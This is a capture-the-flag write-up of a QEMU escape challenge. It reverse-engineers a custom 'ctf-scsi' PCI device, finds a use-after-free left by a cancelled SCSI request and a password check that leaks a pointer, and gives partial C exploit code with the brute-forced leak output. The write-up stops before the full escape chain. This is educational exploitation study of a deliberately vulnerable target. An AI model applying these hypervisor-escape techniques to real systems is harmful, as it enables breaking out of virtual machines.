# SCSI
Actually, I have done this challenge long long ago, but I dont remember how did I make it. So I decided to review it again.  

Download the tgz file from   
https://uaf.io/assets/scsi.tgz  
Decompress it and we got all the neccessary files.

SCSI means mall Computer System Interface, used to communicate with computer devices (hard drive, usb, etc...).


# Analysis

```bash
#!/bin/sh
./qemu-system-x86_64 \
	-L ./dependences \
	-initrd ./rootfs.cpio \
	-kernel ./vmlinuz-4.8.0-52-generic \
	-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
	-m 56M --nographic \
	-device ctf-scsi,id=bus0 \
	-drive file=test.img,if=none,id=d0 \
	-device scsi-disk,drive=d0,bus=bus0.0 \
	-monitor /dev/null
```
There is a new device called `ctf-scsi`, we can analysis it from IDA pro.  

```
void __cdecl ctf_class_init(PCIDeviceClass *a1, void *data)
{
  PCIDeviceClass *v2; // ST18_8

  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                           &a1->parent_class.parent_class,
                           "pci-device",
                           "hw/scsi/ctf.c",
                           361,
                           "ctf_class_init");
  v2->realize = ctf_realize;
  v2->vendor_id = 0x1234;
  v2->device_id = 0x11E9;
  v2->revision = 0;
  v2->class_id = 255;
}
```
Now we can interact with this device through resource  

```bash
/ # lspci
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 1234:11e9

/ # cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource0
0x00000000febf1000 0x00000000febf1fff 0x0000000000040200
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

The device was registered by `ctf_class_init`, the property realize was set to `ctf_realize`.
```C
void __cdecl ctf_realize(CTFState *pdev, Error_0 **errp)
{
  qmemcpy(pdev, pdev, 0x8E0uLL);
  pdev->state = 0;
  pdev->register_a = 0;
  pdev->register_b = 0;
  pdev->register_c = 0;
  pdev->pwidx = 0;
  pdev->dma_buf = 0LL;
  pdev->dma_buf_len = 0;
  memset(&pdev->req, 0, 0xCuLL);
  pdev->pw[0] = 'B';
  pdev->pw[1] = 'L';
  pdev->pw[2] = 'U';
  pdev->pw[3] = 'E';
  pdev->req.cmd_buf = 0LL;
  pdev->cur_req = 0LL;
  pdev->high_addr = 0LL;
  pdev->dma_need = 0;
  pdev->dma_write = ctf_dma_write;
  pdev->dma_read = ctf_dma_read;
  pci_config_set_interrupt_pin_7(pdev->pdev.config, 1u);
  memory_region_init_io(&pdev->mmio, &pdev->pdev.qdev.parent_obj, &mmio_ops_0, pdev, "ctf-scsi", 0x1000uLL); //init I/O
  pci_register_bar(&pdev->pdev, 0, 0, &pdev->mmio);
  scsi_bus_new(&pdev->bus, 0x78uLL, &pdev->pdev.qdev, &ctf_scsi_info, 0LL);
}
```
And it defined two operations, `ctf_mmio_read` and `ctf_mmio_write`.  
`ctf_mmio_read` was defined to read data from dma, `ctf_mmio_write` was defined to set value of the CTFState.  
Actually this challenge created a state machine  
```C
void __cdecl ctf_mmio_write(CTFState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  __int64 addr_1; // [rsp+30h] [rbp+0h]

  switch ( (unsigned __int64)&addr_1 )
  {
    case 0uLL:
      ctf_set_io(opaque, val);
      break;
    case 4uLL:
      if ( opaque->pw[opaque->pwidx] == (_BYTE)val )
      {
        if ( ++opaque->pwidx == 4 )
          opaque->state |= 1u;
      }
      else
      {
        opaque->pwidx = 0;
      }
      break;
    case 8uLL:
      ctf_process_req(opaque, (unsigned int)val);
      break;
    case 0xCuLL:
      ctf_reset(opaque);
      break;
    case 0x10uLL:
      opaque->register_a = val;
      break;
    case 0x14uLL:
      opaque->register_b = val;
      break;
    case 0x18uLL:
      ctf_process_reply(opaque);
      break;
    case 0x1CuLL:
      ctf_add_cmd_data(opaque, val);
      break;
    default:
      return;
  }
}
```

1. check if the pw is "BLUE" with option 4, `opaque->state` -> 1
2. call `ctf_set_io` with option 0, set `opaque->high_addr` to a specific value, `opaque->state` -> 2
3. call `ctf_process_req` with option 8, read 12 bytes to make a `CTF_req_head` structure. Find dev with `scsi_device_find` function. If found, `opaque->state` will be set to 0x10. Read from `addr + 12` into `opaque->req.cmd_buf`. Call `scsi_req_new` to create a SCSI request. `opaque->state` -> 10
4. call `ctf_add_cmd_data` with option 0x1c, read `val` bytes from addr into `opaque->dma_buf`
5. call `ctf_process_reply` with option 0x18, call `cpu_physical_memory_rw` to write into physical address from `opaque->dma_buf`

So where is the bug???  

The bug lies in the `ctf_scsi_info` structure, in this structure, there is a `ctf_request_complete` and a `ctf_request_cancelled` function.  
These 2 functions looks the same, but a little different.  
```
void __cdecl ctf_request_complete(SCSIRequest_0 *req)
{
  CTFState *s; // ST18_8

  s = (CTFState *)req->hba_private;
  s->state ^= 0x10u;
  free(s->req.cmd_buf);
  s->req.cmd_buf = 0LL;
  scsi_req_unref(req);
  s->cur_req = 0LL;
}

void __cdecl ctf_request_cancelled(SCSIRequest_0 *req)
{
  CTFState *s; // ST18_8

  s = (CTFState *)req->hba_private;
  s->state ^= 0x10u;
  free(s->req.cmd_buf);
  s->req.cmd_buf = 0LL;
  scsi_req_unref(req);
}
```
`ctf_request_cancelled` didnt set `s->cur_req` to 0 after it has been called.  

![image](https://user-images.githubusercontent.com/67320649/113397599-dc643480-93cf-11eb-9634-780502dd4edb.png)

then we will get a dangling pointer.  
`ctf_request_cancelled` is not X-refed in IDA pro, let's just assume that it will called if `scsi_req_cancel` is called.

Another bug is that you can bruteforce data after pw, if the value is not correct, `opaque->pwidx` will be reset to 0.
![image](https://user-images.githubusercontent.com/67320649/113400058-cd7f8100-93d3-11eb-9629-f25ecb7341c9.png)

**One thing to notice is that**

HOW do we make `scsi_device_find` function return 0, so that there will be a dangling pointer.  
A [wikipedia entry](https://en.wikipedia.org/wiki/SCSI_command) provided some good points. We don’t really care what these do, as long as they accomplish our goal: leave a request enqueued but not yet completed (so we can cancel it).

```
sdev = scsi_device_find(&opaque->bus, tmp.target_bus, tmp.target_id, tmp.lun);


 {
    dev = (SCSIDevice_0 *)object_dynamic_cast_assert(
                            &kid->child->parent_obj,
                            "scsi-device",
                            "hw/scsi/scsi-bus.c",
                            2004,
                            "scsi_device_find");
    if ( dev->channel == channel && dev->id == ida )
    {
      if ( dev->lun == luna )
        return dev;
      target_dev = dev;
    }
  }
```
First step will be seeing what target_bus/target_id/lun combinations are valid and will be found in scsi_find_device. This function implements a linked list traversal, and stepping through in gdb we see there is only one device, with all three fields 0.

If we set `target_bus`, `target_id` and `target.lun` all to 0, `scsi_device_find` wont return 0, and we can get into the if branch. 

Then `scsi_req_new` will allocate a new request.

Call `scsi_req_enqueue`, this function should return a non-zero value. 
```C
rc = ((__int64 (__fastcall *)(SCSIRequest_0 *, SCSICommand_0 *))req->ops->send_command)(req, &req->cmd);
```
The return value is defined with `send_command`, which called `scsi_disk_emulate_command`.scsi_disk_emulate_command which calls…
scsi_disk_emulate_inquiry which returns nonzero (legal request) if we meet the two checks [here](https://github.com/qemu/qemu/blob/68f1b569dccdf1bf2935d4175fffe84dae6997fc/hw/scsi/scsi-disk.c#L809) (lines 809 and 814)
if scsi_disk_emulate_inquiry returned nonzero, also returns nonzero, which for the top-level ctf_process_req goes on to call…

Then the `scsi_req_continue` will call 
1. req->ops->read_data() 
2. scsi_disk_emulate_read_data
3. scsi_req_data()
4. req->bus->info->transfer_data()
5. ctf_dma_write()
6. if ctf_dma_write() returns non-zero, calls scsi_req_continue

Lets check what ctf_dma_write did.
```
int __cdecl ctf_dma_write(CTFState *opaque, char *buf, int len)
{
  int result; // eax
  int lena; // [rsp+Ch] [rbp-24h]

  lena = len;
  if ( opaque->dma_buf )
  {
    opaque->state |= 0x40u;
    opaque->dma_need = len;
    result = 0;
  }
  else
  {
    opaque->dma_buf = (char *)malloc(len);
    if ( opaque->dma_buf )
    {
      opaque->dma_buf_len = lena;
      memcpy(opaque->dma_buf, buf, lena);
      opaque->state |= 8u;
      result = 1;
    }
    else
    {
      result = 0;
    }
  }
  return result;
}
```
For the first request, this will take the branch that mallocs and returns 1, meaning ctf_transfer_data will call scsi_req_continue and ctf_request_complete (nulling out cur_req).

However if we send a 2nd identical request, ctf_dma_write will return 0, meaning ctf_request_complete will not be called. This means state->cur_req won’t be zeroed out, and we’ll be able to cancel it to free it (by sending a subsequent request with no matching device).

```
struct req_head* req = kzalloc(sizeof(struct req_head)+6, GFP_KERNEL);
req->buf_len = 6; // INQUIRY has length 6
req->data[0] = 0x12; // INQUIRY request
req->data[1] = 0x40; // data[1] and data[2] make it so scsi_disk_emulate_inquiry
req->data[2] = 0;    // (called from scsi_disk_emulate_command) doesnt fail and return -1
req->data[3] = 0x17; // xfer is 16bit from data[3:4], will be 0x1734
req->data[4] = 0x34; // (determines how much data transferred/malloced)
req->data[5] = 0x51; // last byte is...?? doesnt seem used no idea dont care
auth();
send_req(req); // first request completes
send_req(req); // this one doesn't complete

req->target_bus = 17; // no matching device
send_req(req); // cancels previous but doesnt get enqueued, cur_req dangling to previous request
```

`completed->doesnt conpleted->canceled(UAF triggered)`  
Now we need to reclaim this UAFed area. `ctf_add_cmd_data` can be used to accomplish that.
```
void ctf_add_cmd_data(CTFState* state, uint64_t val) {
    uint64_t addr = state->register_a | state->register_b; // this actually involved shifting 32, but theyre ints, so did nothing...
    if (!(state->state & ST_DATA_WRITTEN_TO_DMA)) {
        if (!state->dma_buf) {
            state->dma_buf = malloc(val); // arbitrary size
            if (state->dma_buf)
                cpu_physical_memory_read(addr, state->dma_buf, val); // arbitrary data
        }
    }
}
```



# Exploit

1. Leak dma_read's address with bruteforcing.
2. Use the dangling pointer to create a fake structure.


# Scripting

We can just bruteforce 6 bytes to get the address of `ctf_dma_read`.

```
void set_pwd()
{
    mmio_write(0x4, 'B');
    mmio_write(0x4, 'L');
    mmio_write(0x4, 'U');
    mmio_write(0x4, 'E');
    for(int i = 0; i < 8; ++i){
        mmio_write(0x4, '\x00');
    }
    uint32_t pw_idx = mmio_read(0x14);
    //printf("pw_idx: %d\n", pw_idx);
}

void bruteforce_pointer()
{
    uint64_t pointer = 0;
    for(int t = 0; t < 6; t++){
        for(uint64_t v = 0; v < 256; v++){
            set_pwd();

            uint64_t tmp = pointer;
            for(int k = 1; k <= t; k++){
                char cur_chr = (tmp >> ((k-1)*8)) & 0xff;
                mmio_write(0x4, cur_chr);
            }
            
            mmio_write(0x4, v);
            uint32_t cur_idx = mmio_read(0x14);
            if(cur_idx == 0){
                continue;
            }
            else{
                // else we have the right value
                pointer = (pointer | (v << (t * 8)));
                printf("%p\n", (void*)pointer);
                break;
            }               
        }
    }
}


/ # ./exp
mmio_mem @ 0x7fe3865a2000
user buff virtual address: 0x7fe3865a1000
user buff physical address: 0x3733000
0x5d
0x115d
0xb2115d
0x60b2115d
0xfc60b2115d
0x55fc60b2115d


gdb-peda$ x/20gx 0x55fc60b2115d
0x55fc60b2115d <ctf_dma_read>:	0x30ec8348e5894855	0xe0758948e87d8948
0x55fc60b2116d <ctf_dma_read+16>:	0x48e8458b48dc5589	0x8bf8458b48f84589
0x55fc60b2117d <ctf_dma_read+32>:	0x08e08300000a5080	0xf8458b483074c085
0x55fc60b2118d <ctf_dma_read+48>:	0xc88300000a50808b	0x89f8458b48c28904
```

Then we just create a new SCSI request
